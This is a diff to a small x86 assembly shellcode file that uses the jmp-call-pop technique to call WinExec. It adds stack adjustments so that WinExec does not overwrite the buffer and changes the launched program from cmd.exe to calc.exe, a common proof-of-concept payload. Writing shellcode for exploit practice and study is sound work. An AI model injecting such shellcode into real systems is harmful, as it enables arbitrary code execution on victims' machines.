@@ -7,6 +7,8 @@ global _start
 
 _start:
 
+add esp, 0xffffff11 ;Move esp back up so WinExec doesn't overwrite our buffer
+sub esp, 0xffffff69
 jmp short GetCommand ;jump to the location of the command string
 CommandReturn: ;Define a label to call so that string address is pushed onto stack
     pop ebx ;ebx now points to the string
@@ -24,5 +26,5 @@ CommandReturn: ;Define a label to call so that string address is pushed onto sta
 
 GetCommand: ;Define label for location of command string
     call CommandReturn ;call the return label so the return address (location of string) is pushed onto stack
-    db "cmd.exe" ;Write the raw bytes into the shellcode that represent our string.
+    db "calc.exe" ;Write the raw bytes into the shellcode that represent our string.
     db 0x00 ;Terminate our string with a null character.
